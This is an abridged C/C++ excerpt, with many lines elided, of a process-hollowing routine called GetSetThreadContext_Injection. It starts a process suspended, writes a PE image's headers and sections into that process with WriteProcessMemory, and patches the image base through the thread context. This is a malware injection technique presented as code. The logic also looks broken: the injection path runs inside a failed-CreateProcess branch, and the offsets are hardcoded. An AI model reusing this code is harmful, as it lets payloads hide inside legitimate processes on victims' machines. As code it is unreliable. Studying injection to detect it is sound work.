...
BOOL GetSetThreadContext_Injection()
{
    ...
    { /* not a loop */
        ...
        if (!CreateProcess(lpApplicationName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo,
                           &ProcessInfo))
        {
            ...
            if (pDosHeader->e_magic == IMAGE_DOS_SIGNATURE)
            {
                ...
                if (pNTHeaders->Signature == IMAGE_NT_SIGNATURE)
                {
                    ...
                    pImageBase = VirtualAllocEx(ProcessInfo.hProcess, LPVOID(pNTHeaders->OptionalHeader.ImageBase),
                                                pNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE,
                    ...
                    else
                    {
                        ...
                        WriteProcessMemory(ProcessInfo.hProcess, pImageBase, pBuffer,
                                           pNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
                        for (int Count = 0; Count < pNTHeaders->FileHeader.NumberOfSections; Count++)
                        {
                            pImageSectionHeader =
                                PIMAGE_SECTION_HEADER(DWORD(pBuffer) + pDosHeader->e_lfanew + 248 + (Count * 40));
                            WriteProcessMemory(ProcessInfo.hProcess,
                                               LPVOID(DWORD(pImageBase) + pImageSectionHeader->VirtualAddress),
                                               LPVOID(DWORD(pBuffer) + pImageSectionHeader->PointerToRawData),
                                               pImageSectionHeader->SizeOfRawData, NULL);
                        }
                        WriteProcessMemory(ProcessInfo.hProcess, LPVOID(pContext->Ebx + 8),
                                           LPVOID(&pNTHeaders->OptionalHeader.ImageBase), 4, NULL);
